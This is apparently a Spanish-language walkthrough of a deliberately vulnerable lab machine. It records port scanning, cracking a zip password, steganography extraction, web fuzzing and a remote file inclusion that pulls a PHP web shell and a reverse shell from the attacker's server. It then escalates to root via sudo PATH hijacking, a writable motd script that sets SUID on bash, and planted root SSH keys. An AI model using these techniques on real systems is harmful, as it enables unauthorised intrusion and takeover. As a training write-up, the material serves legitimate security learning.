@@ -1,0 +1,524 @@
+# Enumeracion de puertos, Servicios y Versiones
+
+nmap -Pn -n -sS -p- --open -sCV --min-rate 5000 -v 172.17.0.2 -oN nmap
+
+Nmap scan report for 172.17.0.2
+Host is up (0.0000040s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.5
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| -rw-r--r--    1 0        0               0 Jul 11 06:54 hola_disfruta
+|_-rw-r--r--    1 0        0             293 Jul 11 06:55 respeta.zip
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:172.17.0.1
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 2
+|      vsFTPd 3.0.5 - secure, fast, stable
+|_End of status
+22/tcp open  ssh     OpenSSH 7.7p1 Ubuntu 3ubuntu13.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 63:16:54:2a:05:1d:8e:43:53:55:8b:d5:4e:35:c9:1f (ECDSA)
+|_  256 21:24:77:5d:f8:2f:b2:64:ec:42:8b:0b:ef:f0:46:1b (ED25519)
+80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: OPTIONS HEAD GET POST
+|_http-server-header: Apache/2.4.58 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+MAC Address: 02:42:AC:11:00:02 (Unknown)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+los servicios ssh y ftp son vulnerables:
+
+ftp: podemos acceder con el user anonymous
+ssh: corre una version vulnerable a enumeracion de usuarios
+
+
+# Acceso al servicio ftp
+
+ftp 172.17.0.2
+Connected to 172.17.0.2.
+220 (vsFTPd 3.0.5)
+Name (172.17.0.2:darks): anonymous
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+229 Entering Extended Passive Mode (|||25433|)
+150 Here comes the directory listing.
+-rw-r--r--    1 0        0               0 Jul 11 06:54 hola_disfruta
+-rw-r--r--    1 0        0             293 Jul 11 06:55 respeta.zip
+
+nos conseguimos con 2 archivos pero el archivo >> hola_disfruta <<
+esta vacio y lo podemos deducir solo con su peso [0 kb], en cambio
+el compimido .zip si me lo descargo a mi maquina local
+
+get respeta.zip
+
+local: respeta.zip remote: respeta.zip
+229 Entering Extended Passive Mode (|||33604|)
+150 Opening BINARY mode data connection for respeta.zip (293 bytes).
+100% |***************************************************************************************************************************|   293        3.44 MiB/s    00:00 ETA
+226 Transfer complete.
+
+al intentar descomprimir nos solicita una password, asi que intentare crackearla
+
+zip2john respeta.zip > hashzip
+john --wordlist=/home/darks/Desktop/linux/Kali/diccionarios/rockyou.txt hashzip                       
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+greenday         (respeta.zip/oculto.txt)     
+1g 0:00:00:00 DONE (2024-10-24 13:36) 50.00g/s 819200p/s 819200c/s 819200C/s 123456..cowgirlup
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+y hemos conseguido la password que nos permitira extraer su contenido!
+
+7z x respeta.zip
+pass: *********
+
+y extraemos un archivo .txt [oculto.txt] y leo su contenido
+
+cat oculto.txt
+Consigue la imagen crackpass.jpg
+firstatack.github.io
+sin fuzzing con logica y observando la sacaras ,muy rapido
+
+
+por lo que entiendo debo descargar la imagen que indica el texto 
+y me deja una url, la imagen la termine consiguiendo en la siguiente
+url: https://github.com/firstatack/firstatack.github.io/blob/main/assets/crackpass.jpg
+
+chequeo si tiene archivos ocultos
+
+steghide --info crackpass.jpg
+  embedded file "passwd.zip":
+
+por lo que ahora procedo a extrer el archivo passwd.zip
+
+steghide extract -sf crackpass.jpg
+wrote extracted data to "passwd.zip".
+
+7z x passwd.zip
+
+se extrae un archivo llamado pass que al leerlo contiene unas credenciales
+
+hackeada:denuevo
+
+para el servicio ssh no son validas asi que por ahora no las podre usar, asi que continuo con el servicio
+web, el cual aun no he inspeccionado....
+
+# Servicio web
+
+al chequear el servicio web me consigo con la plantilla de apache2 por lo que ahora aplico fuzzing web
+
+gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x php,txt,html,py,db,js,png,jpg -t 200 -b 404,403,401 --no-error 
+
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://172.17.0.2
+[+] Method:                  GET
+[+] Threads:                 200
+[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
+[+] Negative Status codes:   404,403,401
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              py,db,js,png,jpg,php,txt,html
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/index.html           (Status: 200) [Size: 10671]
+/index.php            (Status: 200) [Size: 1116]
+Progress: 1868787 / 1868796 (100.00%)
+===============================================================
+Finished
+===============================================================
+
+al chequear el /index.php me lleva a una pagina donde observo una barra lateral que contiene 3 enlaces:
+
+enlace 1: http://172.17.0.2/vulndb.com
+enlace 2: http://172.17.0.2/trackedvuln.dl/
+enlace 3: http://172.17.0.2/dockerlabs.es
+
+pero al acceder a ellos, indica que la url no se encuentra en el servidor...
+
+comienzo a buscar sub-dominios con wfuzz pero sin resultados, asi que se me ocurrio colocar vulndb.com, trackedvuln.dl y dockerlabs.es
+como sub-dominios, agregandolos al archivo /etc/hosts
+
+echo '172.17.0.2      vulndb.com trackedvuln.dl dockerlabs.es' >> /etc/hosts
+
+ahora pruebo los diferentes dominios:
+
+http://vulndb.com/ me lleva a la plantilla de apache
+http://dockerlabs.es tambien me lleva a la plantilla de apache
+
+http://trackedvuln.dl/ al acceder me solicita credenciales, asi que pruebo las que consegui anteriormente
+
+hackeada:denuevo
+
+despues de colocar las credenciales me lleva tambien a la plantilla de apache...
+
+le intento hacer fuzzing pero no obtengo respuesto asi que intercepto una peticion con burpsuite
+
+Peticion capturada:
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+GET / HTTP/1.1
+Host: trackedvuln.dl
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Authorization: Basic aGFja2VhZGE6ZGVudWV2bw==
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+If-Modified-Since: Mon, 08 Jul 2024 23:07:43 GMT
+If-None-Match: "29b0-61cc47aff8dc0-gzip"
+Priority: u=0, i
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+aqui observo Authorization: Basic aGFja2VhZGE6ZGVudWV2bw==
+que me parece esta codeado en base64 asi que lo decodifico
+
+echo 'aGFja2VhZGE6ZGVudWV2bw==' |base64 -d
+hackeada:denuevo
+
+son las credenciales, asi que deduzco para poder realizar fuzzing, debo pasarle la cabecera Authorization
+
+gobuster dir -u http://trackedvuln.dl/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x php,txt,html,py,db,js,png,jpg -t 200 -b 404,403,401 --no-error -H "Authorization: Basic aGFja2VhZGE6ZGVudWV2bw=="
+
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://trackedvuln.dl/
+[+] Method:                  GET
+[+] Threads:                 200
+[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
+[+] Negative Status codes:   401,404,403
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              html,py,db,js,png,jpg,php,txt
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/index.html           (Status: 200) [Size: 10672]
+/index.php            (Status: 200) [Size: 901]
+Progress: 1868787 / 1868796 (100.00%)
+===============================================================
+Finished
+===============================================================
+
+al acceder en http://trackedvuln.dl/index.php me muestra el mismo contenido de http://172.17.0.2/index.php pero aqui
+no esta funcionan los enlaces de la barra lateral, asi que pruebo si el /index.php es vulnerable a un LFI con wfuzz
+
+wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u "http://trackedvuln.dl/index.php?FUZZ" -H "Authorization: Basic aGFja2VhZGE6ZGVudWV2bw==" --hh=893
+
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://trackedvuln.dl/index.php?FUZZ
+Total requests: 207643
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                
+=====================================================================
+
+000001915:   200        39 L     104 W      1071 Ch     "love"                                                                                                 
+
+Total time: 74.07747
+Processed Requests: 207643
+Filtered Requests: 207642
+Requests/sec.: 2803.051
+
+conseguimos un parametro, pero al intentar leer archivos del sistema, lanza el siguiente mensaje:
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+Los del SOC tenemos tus datos
+
+Cerca :-( pero lejos
+
+Usa tmp cuando lo necesites recuerdalo te hara falta
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+asi que no podemos leer archivos del sistema, el LFI no funciona, pero aun puedo intentar un RFI
+
+# Probando un RFI
+
+primero me creo un .php malicioso
+
+nano darks.php
+<?php
+	echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
+?>
+^O
+^X
+
+y levanto un server con python
+
+python3 -m http.server 80
+
+ahora procedo a probar si es vulnerable a un RFI (Remote File Inclusion)
+
+url: http://trackedvuln.dl/index.php?love=http://172.17.0.1/darks.php&cmd=id
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+y tenemos ejecucion remota de comandos!!! asi que creo un segundo .php malicioso
+pero esta vez sera la revershell de PentestMonkey, la guardo como darkshell.php
+
+y me coloco en escucha con netcat por el puerto 4444
+
+nc -lnvp 4444 
+
+y lanzo la revershell
+
+http://trackedvuln.dl/index.php?love=http://172.17.0.1/darkshell.php
+
+al acceder a la url gano acceso inmediatamente...
+
+# Acceso al Sistema; user www-data
+
+script /dev/null -c bash 
+stty raw -echo; fg
+reset xterm
+stty rows 38 columns 168
+export TERM=xterm
+export SHELL=bash
+
+sudo -l
+    (norberto) NOPASSWD: /usr/bin/baner
+
+puedo ejecutar el binario /usr/bin/baner como el user norberto
+
+sudo -u norberto /usr/bin/baner
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+Ejecutando 'head' con ruta absoluta:
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+
+Ejecutando 'head' con ruta relativa:
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+al ejecutar el binario, se puede ver que ejecuta el comando head tanto
+con ruta absoluta como relativa, asi que nos vamos aprovechar de la ruta relativa
+para obtener una shell como el user norberto
+
+echo 'bash -p' > /tmp/head && chmod +x /tmp/head
+
+creamos el head en /tmp que es donde podemos crear archivos y luego le damos permisos de
+ejecucion
+
+ahora ejecutamos el binario /usr/bin/baner para obtener la bash como norberto
+
+sudo -u norberto /usr/bin/baner
+
+ahora somos el user norberto, asi que procedo a buscar archivos que le pertenezcan a dicho user
+
+find / -type f -user norberto |grep -v proc
+
+/home/norberto/.profile
+/home/norberto/.bash_logout
+/home/norberto/.-/.miscredenciales
+/home/norberto/.cache/motd.legal-displayed
+/usr/bin/baner
+/usr/bin/mybanner.sh
+
+cat /home/norberto/.-/.miscredenciales
++++++++++++++++++++++++++++++++++++++++++++++
+Hasta aqui no sirvio mi password
+
+⠏⠗⠁⠉⠞⠊⠉⠁⠉⠗⠑⠁⠝⠙⠕⠗⠑⠞⠕⠎
+
+Debes tenerlo a mano te sera util
+Usa mis pass para escalar
+feliz hack de firstatack
++++++++++++++++++++++++++++++++++++++++++++++
+
+le consulte a la IA que eran dichos caracteres y resulta ser brailler, asi que busque 
+en internet un decoder y al descifrarlo el resultado es: practicacreandoretos
+
+intente las credenciales por ssh contra el otro user del sistema, maria, pero no dio resultado
+intente con el user norberto y logre acceder
+
+ssh norberto@172.17.0.2
+pass: practicacreandoretos
+
+al chequear el id observo lo siguiente:
+
+id
+uid=1001(norberto) gid=1001(norberto) euid=1002(maria) egid=1002(maria) groups=1002(maria),100(users),1001(norberto)
+
+asi que consulto el user
+
+whoami
+maria
+
+en este caso, tengo un shell limitada pero aun asi puedo acceder al directorio del user maria y
+al chequear su directorio me consigo con:
+
+ls -la
+total 36
+drwxr-x--- 1 maria maria 4096 Oct 25 08:38 .
+drwxr-xr-x 1 root  root  4096 Jul  9 23:08 ..
+-rw------- 1 maria maria    8 Oct 25 08:38 .bash_history
+-rw-r--r-- 1 maria maria  220 Jul  9 23:08 .bash_logout
+-rw-r--r-- 1 maria maria 3789 Jul 11 05:50 .bashrc
+drwxrwxr-x 3 maria maria 4096 Jul 10 01:15 .local
+-rw-rw-r-- 1 maria maria   45 Jul 13 03:35 .mipass
+-rw-r--r-- 1 maria maria  807 Jul  9 23:08 .profile
+
+cat .mipass
+maria:asientiendesmejor
+Donde podre escribir
+
+como tengo las credenciales de maria, me conecto via ssh:
+
+ssh maria@172.17.0.2
+pass:asientiendesmejor
+
+ahora si obtengo una shell completa del user maria
+
+id
+uid=1002(maria) gid=1002(maria) groups=1002(maria),100(users)
+
+comienzo buscando los archivos que pertenezcan al user maria
+
+find / -user maria 2>/dev/null |grep -v proc
+/dev/pts/0
+/home/maria
+/home/maria/.profile
+/home/maria/.local
+/home/maria/.local/share
+/home/maria/.local/share/nano
+/home/maria/.bash_logout
+/home/maria/.bashrc
+/home/maria/.cache
+/home/maria/.cache/motd.legal-displayed
+/home/maria/.mipass
+/etc/update-motd.d/00-header
+
+chequeando los archivos, el que me llama la atencion es /etc/update-motd.d/00-header
+porque imprime el baner al acceder por ssh
+++++++++++++++++
+SORPRESA
+
+
+FELIZ HACK
+++++++++++++++++
+
+y si chequeo los procesos, en cada acceso via ssh root ejecuta el siguiente proceso:
+
+ps aux |grep root
+
+root          96  0.7  0.0  12528  6368 ?        Ss   10:12   0:00  \_ sshd: maria [priv]
+
+como el archivo es propiedad del user maria, le agrego una linea mas con el siguiente comando:
+
+echo "chmod u+s /bin/bash" >> /etc/update-motd.d/00-header
+
+ahora, para que root ejecute dicho binario vuelvo acceder via ssh y luego consulto el binario /bin/bash
+a ver si le asigno el bit suid
+
+ssh maria@172.17.0.2
+pass:*********
+
+ls -la /bin/bash
+-rwsr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
+
+a funcionado por lo que ahora solo me queda escalar a root
+
+/bin/bash -p
+whoami
+#root
+
+id 
+uid=1002(maria) gid=1002(maria) euid=0(root) groups=1002(maria),100(users)
+
+me voy hasta /root/.ssh
+
+cd /root/.ssh
+
+el directorio esta vacio
+
+asi que creare un par de llaves con ssh-keygen desde mi maquina local
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+Desde mi maquina local
+_______________________
+
+ssh-keygen -t rsa -b 4096
+Generating public/private rsa key pair.
+Enter file in which to save the key (/home/darks/.ssh/id_rsa): 
+Enter passphrase for "/home/darks/.ssh/id_rsa" (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in /home/darks/.ssh/id_rsa
+Your public key has been saved in /home/darks/.ssh/id_rsa.pub
+The key fingerprint is:
+SHA256:TtSYlCiwJ1DOwzV15V7FSQIsgTueIrAfmU3BxnRd0fI darks@kali
+The key's randomart image is:
++---[RSA 4096]----+
+|..o=+.o++*=+.oo. |
+| = o*ooo+=o .oo  |
+|  B..o .+.oo.    |
+|.  +. o. . .E    |
+| o = . oS .      |
+|. = o oo         |
+| . o .  .        |
+|  .              |
+|                 |
++----[SHA256]-----+
+
+cp /home/darks/.ssh/id_rsa .
+cp /home/darks/.ssh/id_rsa.pub .
+cp id_rsa.pub authorized_keys
+
+scp id_rsa maria@172.17.0.2:/home/maria
+pass:*******
+
+scp authorized_keys maria@172.17.0.2:/home/maria
+pass:*******
+
+chmod og-rwx id_rsa
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+ahora movemos los archivos id_rsa y authorized_keys que se encuentran
+en el directorio del user maria a /root/.ssh
+
+[ya estaba de antes en el directorio /root/.ssh]
+
+mv /home/maria/authorized_keys .
+mv /home/maria/id_rsa .
+chown root id_rsa && chown root authorized_keys
+chmod og-rwx id_rsa && chmod og-rwx authorized_keys
+
+primero hice un cambio de propietario en ambos archivos (ahora root es el propietario)
+y luego le doy permisos
+
+por ultimo, desde mi maquina atacante accedo nuevamente via ssh pero esta vez directamente como root y haciendo uso de la id_rsa
+
+ssh -i id_rsa root@172.17.0.2
+id
+uid=0(root) gid=0(root) groups=0(root)
+whoami
+#root
